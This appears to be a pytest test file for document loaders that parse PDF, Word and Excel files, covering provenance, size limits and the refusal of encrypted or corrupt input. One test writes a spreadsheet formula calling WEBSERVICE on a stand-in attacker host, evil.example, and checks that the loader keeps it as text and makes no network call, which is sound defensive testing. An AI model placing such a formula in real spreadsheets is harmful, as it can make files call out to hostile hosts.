"""E4.5 loaders for PDF, DOCX and XLSX: provenance, the limits, and the files that cannot be read.

The files are built here (a hand-written PDF, python-docx, openpyxl), plus the PDF fixtures of the
golden set; nothing is committed to the fixtures folder. The activity is tested in test_parsing.py.
"""

import io
import socket
import uuid
from datetime import date, datetime
from typing import Any

import pytest
from docx import Document
from fixtures import fixture_path
from openpyxl import Workbook
from pdfs import encrypted, make_pdf
from sbam_contracts.api import ErrorCode
from sbam_contracts.documents import ParsedDocument
from sbam_workers.ingest.loaders import Parsed, ParseError, base, loader_for, no_heartbeat, xlsx


def run(kind: str, data: bytes) -> Parsed:
    loader = loader_for(kind)
    assert loader is not None
    return loader(data, no_heartbeat)


def refused(kind: str, data: bytes) -> ErrorCode:
    with pytest.raises(ParseError) as caught:
        run(kind, data)
    return caught.value.code


def document(parsed: Parsed) -> ParsedDocument:
    """What the activity writes as doc.json: it must validate (this also consumes lazy blocks)."""
    return ParsedDocument(
        document_version_id=uuid.uuid4(),
        loader="x",
        blocks=list(parsed.blocks),
        tables=parsed.tables,
    )


def markdown(parsed: Parsed) -> str:
    return parsed.markdown if isinstance(parsed.markdown, str) else "".join(parsed.markdown)


# --- PDF ------------------------------------------------------------------------------------------


def test_e4_5_t01_a_ten_page_text_pdf_has_a_block_for_each_page() -> None:
    pdf = make_pdf([f"Offer line {n} with the parts and prices" for n in range(1, 11)])
    parsed = run("pdf", pdf)
    doc = document(parsed)
    assert [b.page for b in doc.blocks] == list(range(1, 11))
    texts = [b.text for b in doc.blocks][:2]
    assert texts == [
        "Offer line 1 with the parts and prices",
        "Offer line 2 with the parts and prices",
    ]
    assert parsed.report.pages == 10 and parsed.report.ocr_needed_pages == []
    assert markdown(parsed).startswith(
        "<!-- page 1 -->\n\nOffer line 1 with the parts and prices\n"
    )


def test_e4_5_the_golden_text_pdf_is_read_page_by_page() -> None:
    parsed = run("pdf", fixture_path("documents", "text.pdf").read_bytes())
    assert [b.page for b in parsed.blocks] == [1, 2] and parsed.report.ocr_needed_pages == []


def test_e4_5_pages_without_a_text_layer_are_listed_for_ocr_not_failed() -> None:
    mixed = run("pdf", fixture_path("documents", "scanned_mixed.pdf").read_bytes())
    assert [b.page for b in mixed.blocks] == [1] and mixed.report.ocr_needed_pages == [2]
    full = run("pdf", fixture_path("documents", "scanned_full.pdf").read_bytes())
    assert list(full.blocks) == [] and full.report.ocr_needed_pages == [1, 2]
    assert full.report.pages == 2 and markdown(full) == ""


def test_e4_5_t05_a_password_protected_pdf_is_encrypted_and_no_password_is_tried() -> None:
    locked = encrypted(make_pdf(["secret"]), user="hunter2", owner="hunter2")
    assert refused("pdf", locked) is ErrorCode.ENCRYPTED


def test_e4_5_a_pdf_that_opens_without_a_password_is_read_even_if_it_has_an_owner_password() -> (
    None
):
    restricted = encrypted(make_pdf(["open text"]), user="", owner="owner-only")
    assert [b.text for b in run("pdf", restricted).blocks] == ["open text"]


@pytest.mark.parametrize(
    "data",
    [b"%PDF-1.4\nnot really", b"plain text", b"%PDF-1.4\n" + b"\x00" * 200, b""],
    ids=["truncated", "text", "nul", "empty-bytes"],
)
def test_e4_5_a_file_that_is_not_a_readable_pdf_is_corrupt(data: bytes) -> None:
    assert refused("pdf", data) is ErrorCode.CORRUPT


def test_e4_5_a_pdf_with_too_many_pages_is_refused_not_cut(monkeypatch: pytest.MonkeyPatch) -> None:
    from sbam_workers.ingest.loaders import pdf

    monkeypatch.setattr(pdf, "MAX_PDF_PAGES", 3)
    assert run("pdf", make_pdf(["a", "b", "c"])).report.pages == 3
    assert refused("pdf", make_pdf(["a", "b", "c", "d"])) is ErrorCode.PARSE_ERROR


def test_e4_5_control_characters_never_reach_the_text() -> None:
    [block] = run("pdf", make_pdf(["tab\there \x01 gone"])).blocks
    assert "\x01" not in block.text and block.text.startswith("tab")


# --- DOCX -----------------------------------------------------------------------------------------


def docx_bytes(build: Any) -> bytes:
    doc = Document()
    build(doc)
    out = io.BytesIO()
    doc.save(out)
    return out.getvalue()


def sample_docx() -> bytes:
    def build(doc: Any) -> None:
        doc.add_heading("Quote terms", 0)
        doc.add_heading("Scope", 1)
        doc.add_paragraph("Supply of 2,500 boards.")
        doc.add_paragraph("IPC Class 3", style="List Bullet")
        doc.add_paragraph("AS9100D", style="List Bullet")
        doc.add_heading("Prices", 2)
        table = doc.add_table(rows=2, cols=2)
        for cell, text in zip(table._cells, ["MPN", "Qty", "STM32", "12"], strict=True):
            cell.text = text
        doc.add_paragraph("Valid for 30 days.")

    return docx_bytes(build)


def test_e4_5_t04_a_docx_keeps_its_headings_lists_and_table() -> None:
    parsed = run("docx", sample_docx())
    doc = document(parsed)
    kinds = [(b.type.value, b.level, b.text) for b in doc.blocks if b.type.value != "row"]
    assert kinds[:3] == [
        ("heading", 1, "Quote terms"),
        ("heading", 1, "Scope"),
        ("paragraph", None, "Supply of 2,500 boards."),
    ]
    assert ("list_item", None, "IPC Class 3") in kinds and ("heading", 2, "Prices") in kinds
    [table] = doc.tables
    assert table.header == ["MPN", "Qty"] and table.rows == [["STM32", "12"]]
    assert [b.line for b in doc.blocks] == list(range(1, len(doc.blocks) + 1))  # block ordinals
    assert markdown(parsed) == (
        "# Quote terms\n\n# Scope\n\nSupply of 2,500 boards.\n\n- IPC Class 3\n- AS9100D\n\n"
        "## Prices\n\n| MPN | Qty |\n| --- | --- |\n| STM32 | 12 |\n\nValid for 30 days.\n"
    )
    assert parsed.report.tables == 1


def test_e4_5_a_docx_with_no_text_and_no_table_is_empty() -> None:
    assert refused("docx", docx_bytes(lambda doc: None)) is ErrorCode.EMPTY
    assert refused("docx", docx_bytes(lambda doc: doc.add_paragraph("   "))) is ErrorCode.EMPTY


def test_e4_5_a_docx_that_is_only_a_table_is_not_empty() -> None:
    def build(doc: Any) -> None:
        doc.add_table(rows=1, cols=2).rows[0].cells[0].text = "only"

    assert run("docx", docx_bytes(build)).report.tables == 1


@pytest.mark.parametrize("data", [b"", b"PK\x03\x04 not a zip", sample_docx()[:400]])
def test_e4_5_a_docx_that_is_not_a_readable_container_is_corrupt(data: bytes) -> None:
    assert refused("docx", data) is ErrorCode.CORRUPT


def test_e4_5_a_zip_that_is_not_a_word_document_is_corrupt() -> None:
    import zipfile

    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as zf:
        zf.writestr("hello.txt", "not a docx")
    assert refused("docx", out.getvalue()) is ErrorCode.CORRUPT


def test_e4_5_a_container_that_unpacks_too_large_is_refused_before_it_is_read(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(base, "MAX_UNPACKED_BYTES", 1000)
    assert refused("docx", sample_docx()) is ErrorCode.PARSE_ERROR
    monkeypatch.setattr(base, "MAX_UNPACKED_BYTES", 10**9)
    monkeypatch.setattr(base, "MAX_ZIP_ENTRIES", 2)
    assert refused("docx", sample_docx()) is ErrorCode.PARSE_ERROR


# --- XLSX -----------------------------------------------------------------------------------------


def sheet_of(book: Workbook) -> Any:
    """The active sheet (typed Optional by openpyxl; a new workbook always has one)."""
    return book.active


def xlsx_bytes(build: Any) -> bytes:
    book = Workbook()
    build(book)
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


def cells(parsed: Parsed) -> dict[tuple[str, str], str]:
    return {(b.sheet or "", b.cell or ""): b.text for b in parsed.blocks if b.cell}


def test_e4_5_t02_blocks_carry_the_sheet_and_the_cell() -> None:
    def build(book: Workbook) -> None:
        first = sheet_of(book)
        first.title = "Sheet1"
        first.append(["MPN", "Qty"])
        first.append(["STM32", 12])
        first.append([])
        first.append([None, None])
        first["B4"] = 99
        second = book.create_sheet("Prices")
        second.append(["Item", "EUR"])
        second.append(["RC0603", 0.01])

    parsed = run("xlsx", xlsx_bytes(build))
    found = cells(parsed)
    assert found[("Sheet1", "B4")] == "99" and found[("Sheet1", "A2")] == "STM32"
    assert found[("Prices", "B2")] == "0.01" and ("Sheet1", "A3") not in found
    tables = {t.sheet: t for t in parsed.tables}
    assert tables["Sheet1"].range == "A1:B4" and tables["Prices"].range == "A1:B2"
    assert tables["Sheet1"].header == ["MPN", "Qty"]
    assert (parsed.report.sheets, parsed.report.tables) == (2, 2)


def test_e4_5_the_golden_workbook_reads_with_sheet_and_cell_provenance() -> None:
    parsed = run("xlsx", fixture_path("documents", "multi_sheet.xlsx").read_bytes())
    doc = document(parsed)
    assert parsed.report.sheets >= 2 and all(b.sheet for b in doc.blocks)
    assert all(b.cell for b in doc.blocks if b.type.value == "cell")


def test_e4_5_t07_a_formula_stays_text_and_nothing_goes_on_the_network(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def build(book: Workbook) -> None:
        sheet = sheet_of(book)
        sheet.title = "Data"
        sheet["A1"] = '=WEBSERVICE("http://evil.example/x")'
        sheet["A2"] = "=SUM(1,2)"
        sheet["A3"] = "plain"

    def no_network(*args: Any, **kwargs: Any) -> None:
        raise AssertionError("the loader touched the network")

    monkeypatch.setattr(socket.socket, "connect", no_network)
    monkeypatch.setattr(socket, "getaddrinfo", no_network)
    found = cells(run("xlsx", xlsx_bytes(build)))
    assert found[("Data", "A1")] == '=WEBSERVICE("http://evil.example/x")'
    assert found[("Data", "A2")] == "=SUM(1,2)" and found[("Data", "A3")] == "plain"


def test_e4_5_hidden_sheets_are_read_and_noted_and_merged_cells_keep_their_value() -> None:
    def build(book: Workbook) -> None:
        sheet = sheet_of(book)
        sheet.title = "Visible"
        sheet["A1"] = "merged title"
        sheet.merge_cells("A1:C1")
        sheet["A2"] = "x"
        hidden = book.create_sheet("Secret")
        hidden["A1"] = "hidden value"
        hidden.sheet_state = "hidden"

    parsed = run("xlsx", xlsx_bytes(build))
    found = cells(parsed)
    assert found[("Visible", "A1")] == "merged title" and ("Visible", "B1") not in found
    assert found[("Secret", "A1")] == "hidden value"
    assert parsed.report.warnings == ["sheet 'Secret' is hidden"]


def test_e4_5_values_are_shown_the_way_a_reader_expects() -> None:
    def build(book: Workbook) -> None:
        sheet = sheet_of(book)
        sheet.title = "T"
        sheet.append([1, 2.0, 2.5, True, False, date(2026, 10, 22), datetime(2026, 10, 22, 8, 30)])
        sheet.append(["a|b", "line\nbreak"])

    found = cells(run("xlsx", xlsx_bytes(build)))
    first = [found[("T", f"{c}1")] for c in "ABCDEFG"]
    assert first == ["1", "2", "2.5", "TRUE", "FALSE", "2026-10-22T00:00:00", "2026-10-22T08:30:00"]
    assert found[("T", "A2")] == "a|b" and found[("T", "B2")] == "line\nbreak"


def test_e4_5_a_workbook_with_no_values_is_empty() -> None:
    assert refused("xlsx", xlsx_bytes(lambda book: None)) is ErrorCode.EMPTY
    assert refused("xlsx", xlsx_bytes(lambda book: sheet_of(book).append([None, ""]))) is (
        ErrorCode.EMPTY
    )


def test_e4_5_a_far_away_cell_is_refused_by_the_area_limit_not_walked() -> None:
    def build(book: Workbook) -> None:
        sheet_of(book)["A1"] = "x"
        sheet_of(book)["XFD200000"] = "y"  # a used area of 3 billion cells

    assert refused("xlsx", xlsx_bytes(build)) is ErrorCode.PARSE_ERROR


def test_e4_5_more_cells_than_the_limit_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(xlsx, "MAX_XLSX_CELLS", 5)
    monkeypatch.setattr(xlsx, "MAX_GRID_CELLS", 500)

    def build(book: Workbook) -> None:
        sheet_of(book).append(["a", "b", "c"])
        sheet_of(book).append(["d", "e", "f"])

    assert refused("xlsx", xlsx_bytes(build)) is ErrorCode.PARSE_ERROR
    monkeypatch.setattr(xlsx, "MAX_XLSX_CELLS", 6)
    assert run("xlsx", xlsx_bytes(build)).report.tables == 1  # exactly at the limit is fine


@pytest.mark.parametrize("data", [b"", b"PK\x03\x04 no", b"not a zip at all"])
def test_e4_5_an_xlsx_that_is_not_a_readable_container_is_corrupt(data: bytes) -> None:
    assert refused("xlsx", data) is ErrorCode.CORRUPT


def test_e4_5_a_zip_that_is_not_a_workbook_is_corrupt() -> None:
    import zipfile

    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as zf:
        zf.writestr("hello.txt", "not an xlsx")
    assert refused("xlsx", out.getvalue()) is ErrorCode.CORRUPT


def test_e4_5_the_xlsx_markdown_has_a_heading_and_a_table_per_sheet() -> None:
    def build(book: Workbook) -> None:
        sheet_of(book).title = "Rates"
        sheet_of(book).append(["a", "b"])
        sheet_of(book).append(["1", "2"])

    md = markdown(run("xlsx", xlsx_bytes(build)))
    assert md == "## Rates\n\n| a | b |\n| --- | --- |\n| 1 | 2 |\n\n"


def test_e4_5_the_loaders_beat_their_heart_on_a_long_sheet() -> None:
    beats: list[int] = []

    def build(book: Workbook) -> None:
        for n in range(2500):
            sheet_of(book).append([n, "x"])

    loader = loader_for("xlsx")
    assert loader is not None
    loader(xlsx_bytes(build), lambda: beats.append(1))
    assert len(beats) >= 2
